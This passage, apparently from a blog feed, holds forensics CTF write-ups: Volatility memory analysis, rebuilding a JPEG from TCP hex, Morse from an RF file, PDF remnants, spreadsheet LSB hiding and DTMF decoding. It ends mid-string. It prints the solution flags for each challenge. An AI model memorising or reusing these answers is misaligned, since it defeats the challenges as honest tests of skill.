class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">w0lf@hp:~/volatility3$ python3 vol.py -f memdump.mem windows.pslist</span><br><span class="line">Volatility 3 Framework 2.6.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output</span><br><span class="line"></span><br><span class="line">4       0       System  0xe38cb727f6c0  98      -       N/A     False   2025-01-03 16:50:11.000000      N/A     Disabled</span><br><span class="line">260     4       smss.exe        0xe38cb79de040  2       -       N/A     False   2025-01-03 16:50:11.000000      N/A     Disabled</span><br><span class="line">364     356     csrss.exe       0xe38cb7aa2440  9       -       0       False   2025-01-03 16:50:12.000000      N/A     Disabled</span><br><span class="line">428     260     smss.exe        0xe38cb7d79380  0       -       1       False   2025-01-03 16:50:12.000000      2025-01-03 16:50:12.000000      Disabled</span><br><span class="line">436     428     csrss.exe       0xe38cb7d95340  11      -       1       False   2025-01-03 16:50:12.000000      N/A     Disabled</span><br><span class="line">444     356     wininit.exe     0xe38cb7d9a080  1       -       0       False   2025-01-03 16:50:12.000000      N/A     Disabled</span><br><span class="line">488     428     winlogon.exe    0xe38cb7980080  4       -       1       False   2025-01-03 16:50:12.000000      N/A     Disabled</span><br><span class="line">548     444     services.exe    0xe38cb7f8c080  5       -       0       False   2025-01-03 16:50:13.000000      N/A     Disabled</span><br><span class="line">556     444     lsass.exe       0xe38cb7f89080  7       -       0       False   2025-01-03 16:50:13.000000      N/A     Disabled</span><br><span class="line">628     548     svchost.exe     0xe38cb7fdc4c0  17      -       0       False   2025-01-03 16:50:13.000000      N/A     Disabled</span><br><span class="line">672     548     svchost.exe     0xe38cb83ed180  10      -       0       False   2025-01-03 16:50:13.000000      N/A     Disabled</span><br><span class="line">780     488     dwm.exe 0xe38cbae30080  12      -       1       False   2025-01-03 16:50:13.000000      N/A     Disabled</span><br><span class="line">888     548     svchost.exe     0xe38cbaeac500  46      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">896     548     svchost.exe     0xe38cbaeb8340  19      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">904     548     svchost.exe     0xe38cbaebd800  23      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">948     548     svchost.exe     0xe38cbaee1800  12      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">964     548     svchost.exe     0xe38cbaeea800  18      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">624     548     svchost.exe     0xe38cbaf45800  24      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">1076    548     svchost.exe     0xe38cb82032c0  20      -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">1132    548     svchost.exe     0xe38cb824f800  6       -       0       False   2025-01-03 16:50:14.000000      N/A     Disabled</span><br><span class="line">1360    548     svchost.exe     0xe38cb82eb080  6       -       0       False   2025-01-03 16:50:15.000000      N/A     Disabled</span><br><span class="line">1696    548     svchost.exe     0xe38cb83d3800  11      -       0       False   2025-01-03 16:50:16.000000      N/A     Disabled</span><br><span class="line">1776    548     svchost.exe     0xe38cb8006800  5       -       0       False   2025-01-03 16:50:16.000000      N/A     Disabled</span><br><span class="line">1784    548     svchost.exe     0xe38cb800f800  9       -       0       False   2025-01-03 16:50:16.000000      N/A     Disabled</span><br><span class="line">1832    548     MsMpEng.exe     0xe38cb83e6340  27      -       0       False   2025-01-03 16:50:16.000000      N/A     Disabled</span><br><span class="line">2676    548     NisSrv.exe      0xe38cbb0bf800  3       -       0       False   2025-01-03 16:50:23.000000      N/A     Disabled</span><br><span class="line">2144    628     RuntimeBroker.  0xe38cb81a2080  12      -       1       False   2025-01-03 16:50:59.000000      N/A     Disabled</span><br><span class="line">2208    548     svchost.exe     0xe38cbb1de080  7       -       1       False   2025-01-03 16:51:00.000000      N/A     Disabled</span><br><span class="line">2220    888     sihost.exe      0xe38cbb1f8800  10      -       1       False   2025-01-03 16:51:00.000000      N/A     Disabled</span><br><span class="line">2276    888     taskhostw.exe   0xe38cb8140080  11      -       1       False   2025-01-03 16:51:00.000000      N/A     Disabled</span><br><span class="line">2592    488     userinit.exe    0xe38cbb202080  0       -       1       False   2025-01-03 16:51:01.000000      2025-01-03 16:51:31.000000      Disabled</span><br><span class="line">2856    2592    explorer.exe    0xe38cbb239800  70      -       1       False   2025-01-03 16:51:01.000000      N/A     Disabled</span><br><span class="line">2064    628     ShellExperienc  0xe38cbb2a4800  28      -       1       False   2025-01-03 16:51:03.000000      N/A     Disabled</span><br><span class="line">2216    628     SearchUI.exe    0xe38cbb2e3800  16      -       1       False   2025-01-03 16:51:04.000000      N/A     Disabled</span><br><span class="line">3248    2312    ServerManager.  0xe38cbb3d3800  13      -       1       False   2025-01-03 16:51:06.000000      N/A     Disabled</span><br><span class="line">3472    628     dllhost.exe     0xe38cb75b3340  2       -       1       False   2025-01-03 16:52:20.000000      N/A     Disabled</span><br><span class="line">3464    548     msdtc.exe       0xe38cb75c7800  9       -       0       False   2025-01-03 16:52:21.000000      N/A     Disabled</span><br><span class="line">1604    488     fontdrvhost.ex  0xe38cb75d8080  5       -       1       False   2025-01-03 16:54:00.000000      N/A     Disabled</span><br><span class="line">3036    4060    firefox.exe     0xe38cb818b500  89      -       1       True    2025-01-03 16:55:40.000000      N/A     Disabled</span><br><span class="line">3968    3036    firefox.exe     0xe38cb75b9080  22      -       1       True    2025-01-03 16:55:41.000000      N/A     Disabled</span><br><span class="line">3624    3036    firefox.exe     0xe38cbb380080  5       -       1       True    2025-01-03 16:55:41.000000      N/A     Disabled</span><br><span class="line">3828    3036    firefox.exe     0xe38cbb539800  17      -       1       True    2025-01-03 16:55:43.000000      N/A     Disabled</span><br><span class="line">2420    3036    firefox.exe     0xe38cbb711800  5       -       1       True    2025-01-03 16:55:44.000000      N/A     Disabled</span><br><span class="line">4076    3036    firefox.exe     0xe38cbb116080  17      -       1       True    2025-01-03 16:55:45.000000      N/A     Disabled</span><br><span class="line">3132    3036    firefox.exe     0xe38cbb1e1080  5       -       1       True    2025-01-03 16:55:47.000000      N/A     Disabled</span><br><span class="line">712     628     ApplicationFra  0xe38cbb573080  1       -       1       False   2025-01-03 16:56:02.000000      N/A     Disabled</span><br><span class="line">5044    3036    firefox.exe     0xe38cbb7c8800  5       -       1       True    2025-01-03 16:56:43.000000      N/A     Disabled</span><br><span class="line">4772    3036    firefox.exe     0xe38cbb0d6300  18      -       1       True    2025-01-03 16:57:38.000000      N/A     Disabled</span><br><span class="line">1380    2856    FTK Imager.exe  0xe38cbb82e800  20      -       1       False   2025-01-03 17:02:19.000000      N/A     Disabled</span><br><span class="line">5324    3036    firefox.exe     0xe38cbba94080  19      -       1       True    2025-01-03 17:09:52.000000      N/A     Disabled</span><br><span class="line">5804    3036    firefox.exe     0xe38cbb261080  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">2308    3036    firefox.exe     0xe38cbbb44080  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">2712    3036    firefox.exe     0xe38cbba16080  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">3328    3036    firefox.exe     0xe38cbb8c6800  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">6256    3036    firefox.exe     0xe38cbb884800  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">5288    3036    firefox.exe     0xe38cbb8a9800  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">5664    3036    firefox.exe     0xe38cbb7c9080  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">5196    3036    firefox.exe     0xe38cbb8c0800  19      -       1       True    2025-01-03 17:09:56.000000      N/A     Disabled</span><br><span class="line">4508    3036    firefox.exe     0xe38cbbbe8800  19      -       1       True    2025-01-03 17:09:59.000000      N/A     Disabled</span><br><span class="line">4344    3036    firefox.exe     0xe38cbbbb8080  19      -       1       True    2025-01-03 17:10:00.000000      N/A     Disabled</span><br><span class="line">928     3036    firefox.exe     0xe38cbbc8c080  19      -       1       True    2025-01-03 17:10:00.000000      N/A     Disabled</span><br><span class="line">740     3036    firefox.exe     0xe38cbb89e400  19      -       1       True    2025-01-03 17:10:01.000000      N/A     Disabled</span><br><span class="line">2252    3036    firefox.exe     0xe38cb7e25080  19      -       1       True    2025-01-03 17:10:01.000000      N/A     Disabled</span><br><span class="line">2920    3036    firefox.exe     0xe38cbbc9e080  19      -       1       True    2025-01-03 17:10:01.000000      N/A     Disabled</span><br><span class="line">3124    3036    firefox.exe     0xe38cbbca0080  19      -       1       True    2025-01-03 17:10:01.000000      N/A     Disabled</span><br><span class="line">7116    3036    firefox.exe     0xe38cb7e32680  19      -       1       True    2025-01-03 17:10:01.000000      N/A     Disabled</span><br><span class="line">6344    628     smartscreen.ex  0xe38cbbcd9080  13      -       1       False   2025-01-03 17:10:06.000000      N/A     Disabled</span><br><span class="line">7292    7052    MpCmdRun.exe    0xe38cbbad5800  5       -       0       False   2025-01-03 17:10:10.000000      N/A     Disabled</span><br><span class="line">8136    8112    Taskmgr.exe     0xe38cbb713800  15      -       1       False   2025-01-03 17:10:50.000000      N/A     Disabled</span><br><span class="line">4124    628     WmiPrvSE.exe    0xe38cbba9e800  10      -       0       False   2025-01-03 17:11:13.000000      N/A     Disabled</span><br><span class="line">5628    628     WmiPrvSE.exe    0xe38cb7d80080  9       -       0       False   2025-01-03 17:11:13.000000      N/A     Disabled</span><br></pre></td></tr></table></figure><p>This tells us that at the time of memory capture <code>firefox.exe</code> had been running and also since it only happens to be any process to concern, so the next step was to dump the memory of the proces firefox.exe (PID: 3036)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$python3</span> vol.py -f memdump.mem windows.memmap --pid 3036 --dump</span><br></pre></td></tr></table></figure><p>Now I had my firefox process dump and since its a browser so the most sensible thing to search for was URLs but that happened to be too many so now it was just some trial and error until we get the result that it was a google URL that happened to encode our flag in base64.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">.</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0%3D</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h4 id="Decoding-our-Flag"><a href="#Decoding-our-Flag" class="headerlink" title="Decoding our Flag"></a>Decoding our Flag</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$echo</span> <span class="string">&quot;aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0=&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">irisctf&#123;i_am_an_idiot_with_bad_memory&#125;</span><br></pre></td></tr></table></figure><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;i_am_an_idiot_with_bad_memory&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Cheesy-Approach"><a href="#Cheesy-Approach" class="headerlink" title="Cheesy Approach"></a>Cheesy Approach</h4><p>After the CTF ended the discussion led to the revelation that just the string search the base64 encoding of <code>irisct</code> could yield this URL and hence the flag as well.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">w0lf@hp:~/volatility3$ strings memdump.mem | grep aXJpc2N0</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0Z</span><br><span class="line">https://www.google.com/complete/search?client=firefox&amp;channel=fen&amp;q=aXJpc2N0ZntpX2FtX2FuX2l</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0Z</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2F</span><br><span class="line">https://www.google.com/complete/search?client=firefox&amp;channel=fen&amp;q=aXJpc2N0Zn</span><br><span class="line">https://www.google.com/complete/search?client=firefox&amp;channel=fen&amp;q=aXJpc2N0Zn</span><br><span class="line">O^firstPartyDomain=google-b-d.search.suggestions.mozilla,a,::https://www.google.com/complete/search?client=firefox&amp;channel=fen&amp;q=aXJpc2N0ZntpX2FtX2FuX2</span><br><span class="line">https://www.google.com/search?client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2FuX2</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0%3D</span><br><span class="line">client=firefox-b-d&amp;q=aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0%3D</span><br><span class="line">.</span><br><span class="line">..</span><br></pre></td></tr></table></figure><h2 id="Networking"><a href="#Networking" class="headerlink" title="Networking"></a>Networking</h2><h3 id="No-Shark"><a href="#No-Shark" class="headerlink" title="No Shark?"></a>No Shark?</h3><h4 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/./images/chall3.png" alt="Description"></p><p>Source File: <a href="/./files/noshark.tar.gz">noshark.tar.gz</a></p><h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>We received a text file for this challenge which contained some hex encoded data that on initial inspection on cyberchef, happened to be a tcp packet data file.</p><p><img src="/./images/file.png" alt="Given Data"></p><p>On analysing the initial data streams, the first lengthy stream happened to catch my eye with <code>JFIF</code> magic bytes being evidently present which made me believe these are the data packets of a TCP file transfer stream wherein a .jpeg file was sent and hopefully that should contain our flag as well.</p><p><img src="/./images/first_segment.png" alt="Initial Data"></p><h4 id="Constructing-the-image"><a href="#Constructing-the-image" class="headerlink" title="Constructing the image"></a>Constructing the image</h4><p>We can write a simple python script to do the task i.e. remove the first 64 bytes of all data that correspond to tcp headers and hence happen to be same alternatively, and just take and concat the payload bytes to a new file.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">input_file_path = <span class="string">&quot;noshark.txt&quot;</span></span><br><span class="line">output_file_path = <span class="string">&quot;output.jpg&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_file_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> input_file, <span class="built_in">open</span>(output_file_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    hex_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> input_file:</span><br><span class="line">        processed_line = line.strip()</span><br><span class="line">        hex_data += processed_line[<span class="number">132</span>:]</span><br><span class="line">    trimmed_data = hex_data[<span class="number">32</span>:]</span><br><span class="line">    decoded_data = <span class="built_in">bytes</span>.fromhex(trimmed_data)</span><br><span class="line">    output_file.write(decoded_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Data has been successfully processed and saved to <span class="subst">&#123;output_file_path&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/./images/output.jpg" alt="Constructed Image"></p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;welcome_to_net_its_still_ez_to_read_caps_without_wireshark&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RF"><a href="#RF" class="headerlink" title="RF"></a>RF</h2><h3 id="dotdotdot"><a href="#dotdotdot" class="headerlink" title="dotdotdot"></a>dotdotdot</h3><h4 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/./images/chall4.png" alt="Description"></p><p>Source File: <a href="/./files/dotdotdot.tar.gz">dotdotdot.tar.gz</a></p><h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>We are given a .iq file, which are standard RF signal files, so the first step was to convert it to corresponding .wav file which can be easily done using the following command.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sox -e <span class="built_in">float</span> -t raw -r 192000 -b 32 -c 2 dotdotdot.iq -t wav -e <span class="built_in">float</span> -b 32 -c 2 -r 192000 output.wav</span><br></pre></td></tr></table></figure><p>Once we have the data as the wav file, the first thing to inspect was obviously the spectrogram and once we do so, we immediately observe a morse codee present at one of the frequencies.</p><p><img src="/./images/spectrogram.png" alt="Spectrogram"></p><h4 id="Constructing-the-Flag"><a href="#Constructing-the-Flag" class="headerlink" title="Constructing the Flag"></a>Constructing the Flag</h4><p>Now it would have been ideal to apply a low pass filter to make the morse more predominant and then use audio morse decoder but I just went on with manual decoding of the morse using a morse conversion sheet.</p><p>Flag: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;n01s3_g0t_n0th1ng_0n_my_m0rse&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Forensics </tag>
            
            <tag> Wireshark </tag>
            
            <tag> Volatility </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BCACTF 5.0 2024</title>
      <link href="/2024/06/12/BCACTF-5-0-2024/"/>
      <url>/2024/06/12/BCACTF-5-0-2024/</url>
      
        <content type="html"><![CDATA[<p>I participated in BCACTF 2024, as a core member of the team InfoSecIITR. Our team secured 7th place globally. Here are the Writeups of some challenges I was personally able to solve during the competition.</p><h2 id="Forensics-23-719-writeup"><a href="#Forensics-23-719-writeup" class="headerlink" title="Forensics&#x2F;23-719-writeup"></a>Forensics&#x2F;23-719-writeup</h2><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We are given a pdf along with the following description:</p><p>That’s a nice unanimous supreme court decision you’ve made public, sure would be a shame if someone didn’t properly clean up remnants of a prior version of the document before publishing it.</p><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><p>The solution was pretty straight forward we just find for the initials of the flag i.e. <code>bacactf</code> and highlight some of the text </p><p><img src="/./images/23-719_1.png" alt="Image 1"></p><p> So we select that text and paste it in a text editor and we reveal the flag :</p><p><img src="/./images/23-719_2.png" alt="Image 2"></p><p>So our flag becomes -&gt;</p><p><code>bcactf&#123;rEAl_WOrLd_appLIc4t1ons_Of_cTf_ad04cc78601d5da8&#125;</code></p><p>………………………………………………………..</p><h2 id="Forensics-sheep-writeup"><a href="#Forensics-sheep-writeup" class="headerlink" title="Forensics&#x2F;sheep-writeup"></a>Forensics&#x2F;sheep-writeup</h2><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We are given a .shp along with the following hint:</p><p>Figure out what type of file it is and see if there are tools you can use or modify.</p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h3><p>Upon some research we find out that .shp are ESRI shapefiles used in GIS softwares like Google Earth Pro but such softwares require 3 of such files as mandatory which are a .shp, .shx and a .dbf file which work complementorily to produce the geographical data but some more reserach yielded this software that can standalone process a .shp file (<a href="https://softradar.com/shp-viewer/">https://softradar.com/shp-viewer/</a>). So we just load our sheep.shp in the software and thats it we get the flag :</p><p><img src="/./images/sheep_1.png" alt="Image 1"></p><p>So our flag becomes -&gt;</p><p><code>bcactf&#123;SHaPE_f1lEd_b54a11ac9c87c8&#125;</code></p><p>………………………………………………………….</p><h2 id="Forensics-Manipulate-Spreadsheet-2-writeup"><a href="#Forensics-Manipulate-Spreadsheet-2-writeup" class="headerlink" title="Forensics&#x2F;Manipulate Spreadsheet 2-writeup"></a>Forensics&#x2F;Manipulate Spreadsheet 2-writeup</h2><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We are given an excel file for this challenge:</p><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h3><p>The first that we notice is this long string written in the A1 cell of the excel sheet.</p><p><img src="/./images/Manipulate_Spreadsheet_2_1.png" alt="Image 1"></p><p>The hex decode of this string reveals the following hint:</p><pre><code>In digital fields where data lies,Secret pages beneath clear skies.Cells entwine, mysteries feel,Layers of secrets they reveal.</code></pre><p>The layers part hint that there maybe a hidden sheet in this file and exactly that happens to be the case we unhide the sheet 2 of this excel file and there we find some bytes and index data along with another hint in the A1 cell of the sheet</p><p><img src="/./images/Manipulate_Spreadsheet_2_2.png" alt="Image 2"></p><p>The hex decode of this hint reveals:</p><pre><code>Lurking shadows, secrets play,Stealthy whispers on display.BITS aligned, LEAST in SIGht,Gleams of secrets, veiled in light.</code></pre><p>This reveals that we have to arrange the bytes in order of indices and then do LSB extract of the bytes so we do that and we get our flag as:</p><p><code>bcactf&#123;600D_job_Using_900G13_SHe3t5&#125;</code></p><p>…………………………………………………..</p><h2 id="Forensics-Touch-Tone-Telephone-writeup"><a href="#Forensics-Touch-Tone-Telephone-writeup" class="headerlink" title="Forensics&#x2F;Touch Tone Telephone-writeup"></a>Forensics&#x2F;Touch Tone Telephone-writeup</h2><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><p>We are given a .wav along with the following hints:</p><pre><code>-DTMF is a really cool technology-There also used to be A, B, C, and D menu selection keys-How many keys are there in total? Is it a computer science-y number?-For key to number, Start at top left, reading order. (Sorry, 0 is not 0, my bad)</code></pre><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>Based on the hints the course of action gets pretty much cleared that we need to extract the dtmf tones of our wav file then perform a little substitution of keys before finally hex decoding the message. Now there are many online tools to detect the dtmf tones of a wav file but I used the CLI tool <code>multimon-ng</code> which gives us a result for the detected dtmf tones as </p><p><code>47656*6*6D3#315B656*6A6D606531B46D31B4676531434A424A54463147656*B16*686#653#19546768BA316A626*6*316062B831636531B3656A6DB364656431666DB331B2B5626*68B4B83162BABAB5B3626#6A6531B1B5B3B16DBA65BA3#1919466DB3316A6762B33131A13*316B65B431686#6465B731A1B7A6A23#19466DB3316A6762B33131A23*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B33131A33*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131AA3*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B33131A43*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B33131A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B33131A63*316B65B431686#6465B731A1B7AA653#19466DB3316A6762B33131AB3*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B33131A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131A83*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B331A2A13*316B65B431686#6465B731A1B7A2A83#19466DB3316A6762B331A2A23*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A33*316B65B431686#6465B731A1B7A2643#19466DB3316A6762B331A2AA3*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A2A43*316B65B431686#6465B731A1B7A1623#19466DB3316A6762B331A2A53*316B65B431686#6465B731A1B7A4A53#19466DB3316A6762B331A2A63*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B331A2AB3*316B65B431686#6465B731A1B7A663#19466DB3316A6762B331A2A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A2A83*316B65B431686#6465B731A1B7A3653#19466DB3316A6762B331A3A13*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A23*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A3A33*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3AA3*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B331A3A43*316B65B431686#6465B731A1B7A1A33#19466DB3316A6762B331A3A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A63*316B65B431686#6465B731A1B7A1A23#19466DB3316A6762B331A3AB3*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3A73*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A3A83*316B65B431686#6465B731A1B7A5AA3#19466DB3316A6762B331AAA13*316B65B431686#6465B731A1B7AAA83#19466DB3316A6762B331AAA23*316B65B431686#6465B731A1B7A1A43#191919516*6562BA6531676D6*6431BB67686*6531BB6531BA656#6431B86DB531B3626#646D60316B62B363626B6531B46762B431B86DB531BA676DB56*6431686#6465B731686#B46D31B46D316B65B431B4676531666*626B3#195B67656#31B86DB53BB3653166686#68BA6765643*3160626C6531BAB5B36531B46D31BBB362B131B4676531666*626B31686#31B4676531B1B36DB165B331666DB36062B43#19B7B16453655B45666#6DA43B4B653655547B7B5A7B443B36C6#B85567A2A3A7446D6*BA5B67A26DB9AB6A6#5544B86B48B76C4A48B4BBBAA1A5B64#A75A646C46B1545153B6564#556A5354B46D5AABB945556266AB4D4#48AA6#A155B456B5486*68A8436A5166B7454A586044485DA445AAB349425567584B56A8BBD4648</code></p><p>But due to the speed of the wav file some of the dtmf tones get overlapped in this result and doing some manual patching of this result we get the final dtmf tones as :</p><p><code>47656*6*6D3#315B656*6A6D606531B46D31B4676531434A424A54463147656*B16*686#653#19546768BA316A626*6*316062B831636531B3656A6DB364656431666DB331B2B5626*68B4B83162BABAB5B3626#6A6531B1B5B3B16DBA65BA3#1919466DB3316A6762B33131A13*316B65B431686#6465B731A1B7A6A23#19466DB3316A6762B33131A23*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B33131A33*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131AA3*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B33131A43*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B33131A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B33131A63*316B65B431686#6465B731A1B7AA653#19466DB3316A6762B33131AB3*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B33131A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B33131A83*316B65B431686#6465B731A1B7AAA73#19466DB3316A6762B331A2A13*316B65B431686#6465B731A1B7A2A83#19466DB3316A6762B331A2A23*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A33*316B65B431686#6465B731A1B7A2643#19466DB3316A6762B331A2AA3*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A2A43*316B65B431686#6465B731A1B7A1623#19466DB3316A6762B331A2A53*316B65B431686#6465B731A1B7A4A53#19466DB3316A6762B331A2A63*316B65B431686#6465B731A1B7A5A83#19466DB3316A6762B331A2AB3*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A2A73*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A2A83*316B65B431686#6465B731A1B7A3653#19466DB3316A6762B331A3A13*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A23*316B65B431686#6465B731A1B7A66A3#19466DB3316A6762B331A3A33*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3AA3*316B65B431686#6465B731A1B7A3633#19466DB3316A6762B331A3A43*316B65B431686#6465B731A1B7A1A33#19466DB3316A6762B331A3A53*316B65B431686#6465B731A1B7A6663#19466DB3316A6762B331A3A63*316B65B431686#6465B731A1B7A1A23#19466DB3316A6762B331A3AB3*316B65B431686#6465B731A1B7A3A63#19466DB3316A6762B331A3A73*316B65B431686#6465B731A1B7ABA33#19466DB3316A6762B331A3A83*316B65B431686#6465B731A1B7A5AA3#19466DB3316A6762B331AAA13*316B65B431686#6465B731A1B7AAA83#19466DB3316A6762B331AAA23*316B65B431686#6465B731A1B7A1A43#191919516*6562BA6531676D6*6431BB67686*6531BB6531BA656#6431B86DB531B3626#646D60316B62B363626B6531B46762B431B86DB531BA676DB56*6431686#6465B731686#B46D31B46D316B65B431B4676531666*626B3#195B67656#31B8